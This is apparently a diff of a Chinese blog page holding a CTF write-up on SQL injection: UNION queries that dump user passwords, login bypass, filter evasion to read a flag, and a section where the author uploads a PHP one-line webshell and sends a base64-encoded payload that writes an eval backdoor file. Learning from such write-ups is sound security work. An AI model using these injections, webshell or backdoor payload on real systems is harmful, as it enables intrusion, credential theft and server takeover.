@@ -1,190 +1,53 @@
-<!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    
-    <link rel="canonical" href="www.peterpan980927.cn/2017/09/25/CTF-SQL注入/">
-    
-    
-    <title>CTF-SQL注入 | Peterpan&#39;s Blog | Mind over muscle.</title>
+	
+	<title>CTF-SQL注入</title>
+	<meta name="keywords" content="fzb.me,冯宗宝,冯宗宝的blog" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
     
-    <meta name="keywords" content="CTF">
-    <link rel="shortcut icon" href="/img/favicon.ico">
-    <link rel="stylesheet" href="/css/style.css?v=1.0.7">
-    <script type="text/javascript">
-        // Data Center
-        var DC = {
-            reward:	true,
-            lv: JSON.parse('{"enable":true,"app_id":"Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz","app_key":"xDGMWtxNt0aReJDVkuYmSqBd","icon":true}'),
-            v: JSON.parse('{"enable":true,"appid":"Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz","appkey":"xDGMWtxNt0aReJDVkuYmSqBd","notify":false,"verify":false,"placeholder":"望不吝赐教","avatar":"wavatar"}')
-        };
-    </script>
-    <script type="text/javascript">
-        window.lazyScripts=[];
-    </script>
+	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
+    
+        <script src="/js/util.js"></script>
+        <script>
+            if(isMobile()) {
+                loadjscssfile('../css/mobile.css', 'css');
+            } else {
+                loadjscssfile('../css/desktop.css', 'css');
+            }
+        </script> 
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/p1.png?v=3"/>
+    
+
 </head>
 
-
 <body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/bg.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/miao_icon.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">Peter pan</h5>
-          <a href="mailto:15d31f644fafee19d219f5d6b9ac590f" title="15d31f644fafee19d219f5d6b9ac590f" class="mail">15d31f644fafee19d219f5d6b9ac590f</a>
-        </hgroup>
-        
-        <ul class="menu-link">
-          
-              <li>
-                <a href="https://github.com/Peterpan0927" target="_blank">
-                  <i class="icon icon-lg icon-github"></i>
-                </a>
-              </li>
-            
-        </ul>
-        
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                HOME
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/tags"  >
-                <i class="icon icon-lg icon-tags"></i>
-                TAGS
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                ARCHIVES
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/about"  >
-                <i class="icon icon-lg icon-user"></i>
-                ABOUT
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://github.com/Peterpan0927" target="_blank" >
-                <i class="icon icon-lg icon-github"></i>
-                Github
-              </a>
-            </li>
-        
-      </ul>
-    </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row clearfix">
-        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">
-            <span>CTF-SQL注入</span>
-            
-        </div>
-        
-        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
-            <i class="icon icon-lg icon-search"></i>
-        </a>
-        
-    </div>
-</header>
-<header class="content-header post-header">
-    <div class="container fade-scale">
-        <h1 class="title">CTF-SQL注入</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2017-09-24T16:43:40.000Z" itemprop="datePublished" class="page-time">
-  2017-09-25
-</time>
 
 
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/SQL注入-实战演练/">SQL注入 实战演练</a></li></ul>
+<h2 class="title">CTF-SQL注入</h2>
+<!---
+<div style="text-align:center;margin-top: -10px;">
+<div class="article-category">
+发表于2017年9月25日
 
-            
-        </h5>
-        
-    </div>
-    
 
-</header>
+    <a class="article-category-link" href="/categories/SQL注入-实战演练/">SQL注入 实战演练</a>
 
-<div id="site_search">
-    <div class="search-title clearfix">
-        <span class="pull-left">
-          <i class="icon icon-lg icon-search"></i>
-        </span>
-        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
-        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
-          <i class="icon icon-lg icon-close"></i>
-        </a>
-    </div>
-    <div id="local-search-result"></div>
+
+
+ </div>
+--->
 </div>
 
-
-<div class="container body-wrap">
-    <article id="post-CTF-SQL注入"
-  class="post-article article-type-post fade" itemprop="blogPost">
-    <div class="post-card">
-        <h1 class="post-card-title">CTF-SQL注入</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2017-09-25 00:43:40" datetime="2017-09-24T16:43:40.000Z"  itemprop="datePublished">2017-09-25</time>
-
-            
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/SQL注入-实战演练/">SQL注入 实战演练</a></li></ul>
-
-
-
-            
-	<span id="/2017/09/25/CTF-SQL注入/" class="leancloud_visitors" data-flag-title="CTF-SQL注入" title="CTF-SQL注入">
-		
-			<i class="icon icon-eye"></i>
-		
-		<span class="leancloud-visitors-count"></span>
-	</span>
- 
-
-            
-    <span>
-        <i class="icon icon-comment-o"></i>
-        <a href="/2017/09/25/CTF-SQL注入/#comment">
-            <span class="valine-comment-count" data-xid="/2017/09/25/CTF-SQL注入/"></span>
-        </a>
-    </span>
-
-
-            
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <p>虽然比赛已经过去了一段时间，但是训练依然不能落后，上次苦练的密码、杂项、隐写，半点没考，看来SQL注入和缓冲区溢出还是占比较重啊。</p>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入原理和讲解"><span class="toc-text">SQL注入原理和讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验原理和三层架构"><span class="toc-text">实验原理和三层架构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实验原理"><span class="toc-text">实验原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web程序三层架构"><span class="toc-text">Web程序三层架构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入漏洞"><span class="toc-text">SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注入实例之猜解数据库"><span class="toc-text">注入实例之猜解数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入实例之验证绕过"><span class="toc-text">注入实例之验证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#判断SQL注入点"><span class="toc-text">判断SQL注入点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入实战"><span class="toc-text">SQL注入实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实战一"><span class="toc-text">实战一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实战二"><span class="toc-text">实战二</span></a></li></ol></li></ol></li></ol></li></ol>
+<p>虽然比赛已经过去了一段时间，但是训练依然不能落后，上次苦练的密码、杂项、隐写，半点没考，看来SQL注入和缓冲区溢出还是占比较重啊。</p>
 <a id="more"></a>
 <h1 id="SQL注入原理和讲解"><a href="#SQL注入原理和讲解" class="headerlink" title="SQL注入原理和讲解"></a>SQL注入原理和讲解</h1><h2 id="实验原理和三层架构"><a href="#实验原理和三层架构" class="headerlink" title="实验原理和三层架构"></a>实验原理和三层架构</h2><h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>SQL注入是通过将恶意的SQL查询或添加语句插入到应用的参数中，再再后台的SQL服务器中解析执行进行的攻击，它是目前黑客对数据库对数据库进行攻击的最常用手段之一。或者说是将恶意sql，植入到系统中。或者跳过系统本身校验，访问系统数据。</p>
 <h4 id="Web程序三层架构"><a href="#Web程序三层架构" class="headerlink" title="Web程序三层架构"></a>Web程序三层架构</h4><p>通常意义上我们把整个业务应用划分为：</p>
@@ -194,10 +57,7 @@
 <li>数据访问层（Data access layer）</li>
 </ul>
 <p>区分层次的目的即为了”高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发：</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8810.44.48.png" alt="" title="" class="">
-                <p></p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8810.44.48.png" alt=""></p>
 <p>在上图中，用户访问实验楼主页进行了如下过程：</p>
 <ul>
 <li>在 Web 浏览器中输入 <code>www.shiyanlou.com</code> 连接到实验楼服务器。</li>
@@ -224,10 +84,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT userName FROM users WHERE user_id = &apos;1&apos; union select database(),user()#;</div><div class="line">#比如利用union语句来拼接多条查询语句,获取当前查询的用户名</div></pre></td></tr></table></figure>
 <p>当然这些信息都没有什么卵用，接下来直接上一个重量级的，爆出它所有的账号密码吧：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select userName from users where user_id = &apos;1&apos; union select user,password from users;</div></pre></td></tr></table></figure>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8811.24.40.png" alt="" title="" class="">
-                <p></p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-22%20%E4%B8%8B%E5%8D%8811.24.40.png" alt=""></p>
 <p>虽然密码使用md5加密过了，但是这种玩意去网上随便找个在线工具就破开了，还是挺有意思</p>
 <h4 id="注入实例之验证绕过"><a href="#注入实例之验证绕过" class="headerlink" title="注入实例之验证绕过"></a>注入实例之验证绕过</h4><p>接下来再来试试一个利用SQL漏洞绕过登陆验证的实验，如果我们不知道登陆的话干脆就不要理他好了，悄悄的从旁边绕过去～</p>
 <p>这种情况下后台的代码验证类似于这种情况：</p>
@@ -251,10 +108,7 @@
 <p>判断SQL注入类型</p>
 </blockquote>
 <p>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分<strong>常用</strong>的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-24%20%E4%B8%8B%E5%8D%8811.01.27.png" alt="" title="" class="">
-                <p></p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-24%20%E4%B8%8B%E5%8D%8811.01.27.png" alt=""></p>
 <ul>
 <li>字符型</li>
 </ul>
@@ -281,14 +135,8 @@
 <li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
 </ol>
 <p>至于后台执行的SQL语句可以直接参考字符型的。</p>
-<h2 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h2><h3 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h3><p>刚刚点进去的时候如右图所示：<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.23.25.png" alt="" title="" class="">
-                <p></p>
-            </figure></p>
-<p> 1.为了知道到底传递了什么参数，我们输入了1并提交，然后发现了<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.24.49.png" alt="" title="" class="">
-                <p></p>
-            </figure></p>
+<h2 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h2><h3 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h3><p>刚刚点进去的时候如右图所示：<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.23.25.png" alt=""></p>
+<p> 1.为了知道到底传递了什么参数，我们输入了1并提交，然后发现了<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.24.49.png" alt=""></p>
 <p> 2.而在输入1’的时候报错，所以判断存在注入点，因为需要获得flag值，初步预估后台存储flag的表应该为flag,所以需要构造一条语句来查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select flag from flag</div></pre></td></tr></table></figure>
 <p> 3.根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1’  union select flag from flag where ‘t’=’t</p>
@@ -299,10 +147,7 @@
 <p> 5.使用+号在空格之前连接(在url中进行拼接)：</p>
 <p>1’+unionunion +selectselect +flag+fromfrom +flag+wherewhere+’t’=’t</p>
 <p>这样的话就可以提交成功了，这种事情比较需要坚持不懈的毅力，半途而废是找不到漏洞的！</p>
-<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.37.50.png" alt="" title="" class="">
-                <p></p>
-            </figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.37.50.png" alt=""></p>
 <h4 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h4><p>今天为了检测一个文件上传下载的应用有没有漏洞，所以就对它进行了一下基本的注入，果然是有漏洞的hhh，虽然这个并不是SQL注入的漏洞，但是在这里也可以拿出来说一下，说到文件上传，大家首先想到的自然是文件包含漏洞，我首先构造的是一个隐蔽的php一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>然后尝试着上传这个文件,emmmm，并没有对上传的文件类型做限制，所以很轻松的就上传了上去，接下来就可以通过工具（或者社工）找到上传文件的路径，然后执行这个php脚本，手动的去拼接参数：</p>
@@ -310,313 +155,33 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/python</span></div><div class="line"><span class="comment">#encoding=utf-8</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_decode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 通过url传输时去掉了=号，所以需要补上=号</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64decode(str(string + <span class="string">'='</span> * (<span class="number">4</span> - len(string) % <span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_encode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(str(string)).rstrip(<span class="string">'='</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    s=raw_input(<span class="string">'please input the type--&gt;encode/decode:\n'</span>)</div><div class="line">    <span class="keyword">if</span> s==<span class="string">'encode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to encode:'</span>)</div><div class="line">        r=base64_url_encode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">elif</span> s==<span class="string">'decode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to decode:'</span>)</div><div class="line">        r=base64_url_decode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'fuck you!!!\nasshole!\ndon’t you know english?'</span>)</div></pre></td></tr></table></figure>
 <p>这样一来，我们就可以用这个工具在执行脚本的时候传递我们所需要的参数了，比如说创建一个hack.php的文件，在url中可以进行这样的拼接：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id?a=assert&amp;code=$&#123;fputs%28fopen%28base64_decode%28aGFjay5waHA%29,w%29,base64 _decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgIGVjaG8iPGgxPnlvdSBhcmUgaGFja2VkPC9oMT4iPz4%29%29&#125;;</div></pre></td></tr></table></figure>
-<p>当你访问的时候效果就是：<figure class="image-box">
-                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8B%E5%8D%885.25.52.png" alt="" title="" class="">
-                <p></p>
-            </figure></p>
+<p>当你访问的时候效果就是：<img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8B%E5%8D%885.25.52.png" alt=""></p>
 <p>当然你可以传递进去参数把它文件删除也是可以的，平时在写应用的时候还是要多考虑一下安全问题呀。</p>
 
-        </div>
-        
-        
-<blockquote class="post-copyright">
-    <div class="content">
-        
-<span class="post-time">
-    Last updated: <time datetime="2018-03-13T16:00:22.807Z" itemprop="dateUpdated">2018-03-14 00:00:22</time>
-</span><br>
 
-
-        
-        转载注明出处，原文地址：<a href="/2017/09/25/CTF-SQL注入/" target="_blank" rel="external">http://yoursite.com/2017/09/25/CTF-SQL注入/</a>
-        
-    </div>
-    <footer>
-        <a href="http://yoursite.com">
-            <img src="/img/miao_icon.jpg" alt="Peter pan">
-            Peter pan
-        </a>
-    </footer>
-</blockquote>
-
-        
-            <div class="page-reward">
-    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
-</div>
-
-            
-        
-        <div class="post-footer">
-            
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-
-            <div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2017/09/25/CTF-SQL注入/&title=《CTF-SQL注入》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2017/09/25/CTF-SQL注入/&title=《CTF-SQL注入》 — Peterpan's Blog&source=虽然比赛已经过去了一段时间，但是训练依然不能落后，上次苦练的密码、杂项、隐写，半点没考，看来SQL注入和缓冲区溢出还是占比较重啊。" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-        </div>
-        
-            
-    <div id="comment"></div>
-
-
-        
-    </div>
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2017/09/29/iOS多线程/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">iOS多线程</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2017/09/18/CTF-安全杂项/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">CTF-MISC</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-</article>
-
-    <div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        我们一起来让这个世界有趣一点
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <div class="reward-content">
-        
-        <div class="reward-code">
-            <img id="rewardCode" src="/img/wc.png" alt="打赏二维码">
-        </div>
-        
-        <label class="reward-toggle">
-            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
-                data-wechat="/img/wc.png" data-alipay="/img/123.png">
-            <div class="reward-toggle-ctrol">
-                <span class="reward-toggle-item wechat">微信</span>
-                <span class="reward-toggle-label"></span>
-                <span class="reward-toggle-item alipay">支付宝</span>
-            </div>
-        </label>
-        
-    </div>
-</div>
-
-    
-
-</div>
-
-    <aside class="post-widget">
-        <nav class="post-toc-wrap" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入原理和讲解"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL注入原理和讲解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实验原理和三层架构"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">实验原理和三层架构</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实验原理"><span class="post-toc-number">1.1.0.1.</span> <span class="post-toc-text">实验原理</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Web程序三层架构"><span class="post-toc-number">1.1.0.2.</span> <span class="post-toc-text">Web程序三层架构</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL注入漏洞"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">SQL注入漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注入实例之猜解数据库"><span class="post-toc-number">1.2.0.1.</span> <span class="post-toc-text">注入实例之猜解数据库</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#注入实例之验证绕过"><span class="post-toc-number">1.2.0.2.</span> <span class="post-toc-text">注入实例之验证绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#判断SQL注入点"><span class="post-toc-number">1.2.0.3.</span> <span class="post-toc-text">判断SQL注入点</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL注入实战"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">SQL注入实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实战一"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">实战一</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#实战二"><span class="post-toc-number">1.3.1.1.</span> <span class="post-toc-text">实战二</span></a></li></ol></li></ol></li></ol></li></ol>
-        </nav>
-    </aside>
-    
-        <footer class="footer">
-    
-    <div class="top">
-        
-        
-            <p>
-    <span>Links：</span>
-    
-    <span class="blogroll-item">
-        <a href="https://www.github.com/Peterpan0927" target="_blank">github</a>
-    </span>
-    
-    <span class="blogroll-item">
-        <a href="https://bbs.iosre.com" target="_blank">iOSRE</a>
-    </span>
-    
-    <span class="blogroll-item">
-        <a href="https://www.coding.net" target="_blank">coding</a>
-    </span>
-    
-</p>
-
-        
-    </div>
-    
-    <div class="bottom">
-        <p>
-            <span>
-                Peter pan &copy; 2017 - 2018
-            </span>
-        		
-           	
-            
-            
-            <span>
-	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
-            </span>
-            
-            
-            
-        </p>
-    </div>
-</footer>
-
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
-
-
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2017/09/25/CTF-SQL注入/&title=《CTF-SQL注入》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2017/09/25/CTF-SQL注入/&title=《CTF-SQL注入》 — Peterpan's Blog&source=虽然比赛已经过去了一段时间，但是训练依然不能落后，上次苦练的密码、杂项、隐写，半点没考，看来SQL注入和缓冲区溢出还是占比较重啊。" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACQklEQVR42u3aQW7DMAwFUd//0i7QVYFWznzSKWJqtAqcxM7TgqFIHgde5/f6+fr3ldW7199areMdS4YMGY9lkNutbn19nf+s6+ciqgwZMjZgkCC7+vz1FbJB/FnL6zJkyJABAnHnNdk+GTJkyEgDbnoE/dD/DRkyZDyKwRO4fpksJd18FpchQ8YDGbXGwP+8fnt/Q4YMGR/PONuLJG21wB38BhkyZIxmXI9H8BBMGgC8hEcOty/CrgwZMoYy0tJ8J7lME9Bi1VCGDBnjGGnZqx+I06GN4CgrQ4aMQQzSPqwNgaVJJxk7W95ZhgwZoxnkeFkby+Ahu3bP5dbIkCFjG0ZaROPjFKTMxxPQeMZNhgwZj2X0C/qd1DAtsaEWpgwZMsYxaq3KWvGulvDF7UwZMmSMY3DZXaTOHr/435AhQ8Y4RjraVWtqcgB54h/3lCFDxmgGP1LWMKTon85RoDvIkCFjEIO3D9M0kQTutGGw/IwMGTJGMzrDFp30rjioSrZYhgwZQxkkUKZtSLLIdhSrhjJkyNiGQRLBTnsyDd/x+VuGDBnjGLVkjrck+dbwfHY53SZDhoxxDF7kqh1W0w3q/DHIkCFjHuMMV7+FSUbByHMPkqXKkCFjBIOvToGMk2pDHjJkyNiB0Q+yaXDkgxTFs7gMGTKGMtLpDPKtdNSMH55lyJAhg6do6fBWGkyDMTIZMmTIaIxT1Jqd/NArQ4aMfRjpmFcaWDtjYXHmKEOGjHGM2+Y1wlCebkptNESGDBkPZ3wBGRCTYZSAdl4AAAAASUVORK5CYII=" alt="微信分享二维码">
-</div>
-
-
-    
-    <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.0.7"></script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-
-<script type="text/javascript" src="/js/method.js?v=1.0.7"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.0.7"></script>
-
-<!-- third-party -->
-
-
-
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.0.7"></script>
+<!--<a href="http://yoursite.com/2017/09/25/CTF-SQL注入/#disqus_thread" class="article-comment-link">Comments</a>
+<div id="disqus_thread"></div>
 <script type="text/javascript">
